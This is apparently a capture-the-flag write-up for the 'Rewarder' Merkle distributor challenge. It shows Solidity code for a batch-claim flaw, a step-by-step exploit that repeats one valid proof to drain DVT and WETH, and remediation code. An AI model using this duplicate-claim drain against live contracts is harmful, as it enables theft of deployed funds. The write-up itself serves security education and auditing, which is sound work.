# Challenge #5: The Rewarder

- **Difficulty**: Medium
- **Category**: Merkle Claim Duplication
- **Severity**: High
- **Status**: SOLVED

## Overview

A Merkle-based token distributor allows users to claim rewards (DVT tokens and WETH) by providing valid Merkle proofs. The distributor processes batch claims efficiently, marking claims as processed to prevent double-spending. However, a flaw in how claim status is tracked allows duplicate claims within a single transaction.

## Vulnerability

The distributor processes multiple claims in a batch via `claimRewards()`. The critical issue is in the claim tracking mechanism:

```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    for (uint256 i = 0; i < inputClaims.length; i++) {
        _verifyClaim(inputClaims[i], inputTokens[inputClaims[i].tokenIndex]);
        inputTokens[inputClaims[i].tokenIndex].transfer(msg.sender, inputClaims[i].amount);
    }
    // Marks as claimed AFTER the loop — only the last entry
    _setClaimed(inputClaims[inputClaims.length - 1]);
}
```

The `_setClaimed()` function is called **after** the entire loop completes, and only for the last claim in the array. Within the loop, each claim is verified against the Merkle tree independently. Since the same valid proof can be submitted multiple times and the "claimed" flag is not set until after all transfers, duplicate claims all pass verification and trigger token transfers.

## Exploit Walkthrough

**Step 1**: Identify valid claims from the Merkle tree for the attacker's address:

```solidity
uint256 PLAYER_DVT_AMOUNT = 11524763827831882;
uint256 PLAYER_WETH_AMOUNT = 1171088749244340;
```

**Step 2**: Construct an array of duplicate claims — the same valid claim repeated N times:

```solidity
uint256 dvtRepeat = dvtBalance / PLAYER_DVT_AMOUNT;
uint256 wethRepeat = wethBalance / PLAYER_WETH_AMOUNT;

Claim[] memory claims = new Claim[](dvtRepeat + wethRepeat);
for (uint256 i = 0; i < dvtRepeat; i++) {
    claims[i] = Claim({
        batchNumber: 0,
        amount: PLAYER_DVT_AMOUNT,
        tokenIndex: 0,
        proof: dvtProof
    });
}
for (uint256 i = 0; i < wethRepeat; i++) {
    claims[dvtRepeat + i] = Claim({
        batchNumber: 0,
        amount: PLAYER_WETH_AMOUNT,
        tokenIndex: 1,
        proof: wethProof
    });
}
```

**Step 3**: Submit the batch:

```solidity
distributor.claimRewards(claims, tokens);
```

Each duplicate passes Merkle verification and triggers a transfer. The claimed flag is only set once at the end.

**Step 4**: Transfer drained funds to the recovery address.

## Real-World Impact

- **Optimism RetroPGF Round 2**: Duplicate claim vulnerabilities were identified in retroactive public goods funding distributions with similar batch processing flaws.
- **Merkle distributor bugs** have been found in multiple token airdrops and reward systems. The pattern of "check-then-mark" vs. "mark-then-check" is a recurring vulnerability source.
- **Sushi MasterChef** and other reward distribution contracts have undergone audits specifically targeting reward duplication vectors.

## Remediation

```solidity
// Fix 1: Mark claimed BEFORE transferring (checks-effects-interactions)
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    for (uint256 i = 0; i < inputClaims.length; i++) {
        _verifyClaim(inputClaims[i], inputTokens[inputClaims[i].tokenIndex]);
        require(!_isClaimed(inputClaims[i]), "Already claimed");
        _setClaimed(inputClaims[i]);
        inputTokens[inputClaims[i].tokenIndex].transfer(msg.sender, inputClaims[i].amount);
    }
}

// Fix 2: Deduplicate claims in batch
mapping(bytes32 => bool) seenInBatch;
bytes32 claimHash = keccak256(abi.encode(claim.batchNumber, claim.tokenIndex, msg.sender));
require(!seenInBatch[claimHash], "Duplicate claim in batch");
seenInBatch[claimHash] = true;
```

## Key Takeaway

Always mark claims as processed before executing transfers — the checks-effects-interactions pattern applies to batch operations too.
